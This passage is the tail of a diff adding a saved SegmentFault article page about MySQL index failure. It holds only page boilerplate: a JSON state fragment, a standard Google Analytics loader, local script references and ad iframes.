":30,"count":0,"total_page":0,"rows":[]},"loading":false,"information":{},"articles":[]},"sitesSet":{"loading":false,"information":{}},"loading":{"global":false,"models":{"articleDetail":false},"effects":{"articleDetail\u002FgetArtDetail":false}}};
+	</script>
+
+    <script src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/gt.js.下载"></script>
+    <script>
+      (function () {
+        var data = window.g_initialProps["gtagData"] || window["gtagData"];
+        var script = document.createElement("script");
+        script.src = "https://www.googletagmanager.com/gtag/js?id=UA-918487-8";
+        script.async = true;
+        script.onload = function () {
+          window.dataLayer = window.dataLayer || [];
+          window.gtag = function () {
+            window.dataLayer.push(arguments);
+          };
+          window.gtag("js", new Date());
+          window.gtag("config", "UA-918487-8");
+          data && window.gtag("set", data);
+        };
+        document.getElementsByTagName("head")[0].appendChild(script);
+      })();
+    </script>
+    <script src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/umi.js.下载"></script>
+  
+
+
+  <div class="is-active ImageView p-4" style="display: none;">
+      <div class="ImageView-inner" style="overflow: auto;">
+          <img src="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article" class="ImageView-img" alt="preview" style="max-width: 100%">
+      </div>
+  </div><ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;"><ins id="aswift_2_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;" tabindex="0" title="Advertisement" aria-label="Advertisement"><ins id="aswift_2_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe id="aswift_2" name="aswift_2" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/ads(2).html" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!3" data-load-complete="true"></iframe></ins></ins></ins><iframe id="google_osd_static_frame_6694728853020" name="google_osd_static_frame" style="display: none; width: 0px; height: 0px;" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/saved_resource(2).html"></iframe></body><iframe id="google_esf" name="google_esf" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/zrt_lookup.html" data-ad-client="ca-pub-6330872677300335" style="display: none;"></iframe></html>
